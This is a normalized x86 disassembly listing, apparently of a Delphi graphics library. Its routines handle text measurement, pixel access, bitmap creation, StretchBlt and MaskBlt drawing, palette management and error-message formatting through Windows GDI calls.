call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_42486c
inc eax
add edi eax
sub_424828
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4041e0
push eax
mov eax edi
call sub_4043e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_42486c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424828
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424888
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424828
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4248a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4248f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248fb
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424660
sub_424954
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_424978
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424688
pop ecx
pop edx
pop edi
pop esi
retn
sub_424998
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_4249c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax [ ebp + 0x8 ]
call sub_423580
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424a2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424a8c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_424a2c
mov edx esp
mov eax ebx
call sub_424954
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_424978
sub_424ae0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424b7c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
test bl 0x8
je r-xdata
mov eax esi
call sub_424ba8
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424bd8
sub_424b7c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_423a54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424ba8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423f54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424bd8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424240
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424240
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424320
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424204
call sub_423580
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424204
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424d08
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424d52
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d59
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_424d5c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424df8
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424d08
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404190
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424dff
lea eax [ ebp - 0x104 ]
call sub_403f20
retn
sub_424e14
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424f62
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424ed1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_424d5c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_424d5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f69
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424f74
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424fa8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425228
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424e04
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42522f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424e04
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42507b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406af4
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42522f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_42523c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425274
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402ba4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_4252ec
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_425344
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028d8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425441
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425448
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_42545c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4254e2
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4254f4
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028d8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_4252ec
mov eax esp
call sub_42545c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425598
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_4252ec
mov [ esp ] eax
sub_4255ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424f94
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424f74
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425798
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424e04
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4256be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424e14
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256c5
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424d08
sub_4256c5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424f94
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424e04
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425778
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424e14
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42577f
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4257b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_425844
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c80
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_425b3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_42592d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424d08
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425934
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425934
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_4257a8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407c80
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_425b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4255ec
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
